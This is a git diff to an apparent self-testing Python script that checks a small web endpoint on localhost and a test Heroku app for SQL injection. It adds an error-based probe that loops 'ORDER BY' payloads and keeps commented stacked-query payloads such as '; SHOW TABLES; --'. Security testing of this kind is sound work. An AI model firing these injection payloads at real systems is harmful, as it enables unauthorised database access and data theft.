@@ -1,3 +1,4 @@
+# -- coding: utf-8 --
 import os
 import sys
 import urllib2
@@ -5,6 +6,7 @@ import httplib
 import json as js
 # from datetime import datetime
 import time
+import requests
 
 
 def check_boolean_based_attack(url):
@@ -52,42 +54,30 @@ def check_time_based_attack(url):
             print "The response time after boolean attack SLEEP(15) is: " + str(duration) + "\n"
 
 
-def check_if_database_error_exposed(str):
-    newStr = str + "%3B%20Select%20*%20from%20aasdafasflkdsajfdsauoiewanklrjfjdalskjf%20"
-    print(newStr)
-    contents = urllib2.urlopen(newStr)
-    print(contents.read())
-    print(contents.getcode())
-
+def check__error_based_attack(url):
+    for i in range(1, 1000):
+        newUrl = url + "'%20ORDER%20BY%20" + str(i) + "%3B--%20"
+        r = requests.get(newUrl)
+        # print r.content
+        # print r.status_code
+        # print r.content.find("ER_BAD_FIELD_ERROR") != -1
+        if r.status_code != 200 and r.content.find("ER_BAD_FIELD_ERROR") != -1:
+            print "This web server is potentially vulnerable for error based attack. " \
+                  "The suggestion is do not exposed detailed database error to the public."
+            print "The error message is:"
+            print r.content
+            print
+            break
 
 online = "https://my-securitytest.herokuapp.com/getFriend/user1"
 local = "http://localhost:3000/getFriend/user1"
 
 check_boolean_based_attack(local)
-check_time_based_attack(local)
 check_stack_query(local)
+check__error_based_attack(local)
 
-# #
-#
-# check_stack_query(origin)
+# check_time_based_attack(local)
 
-# print json[0]['title']
-# # a = booleanattack("https://lit-garden-23003.herokuapp.com/getFriend/user1")
-# # print(a)
-#
-# check_if_database_error_exposed(origin)
-
-# contents = urllib2.urlopen(a)
-# print(contents.read())
-# print contents.getcode()
-
-# b = check_multiple_query(origin)
-# print(b)
-# contents2 = urllib2.urlopen(b)
-# print(contents2.read())
-# print contents2.getcode()
-# check_multiple_query(origin)
-#
 # localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
 # localhost:3000/getFriend/user1'; SHOW TABLES; --%20
 
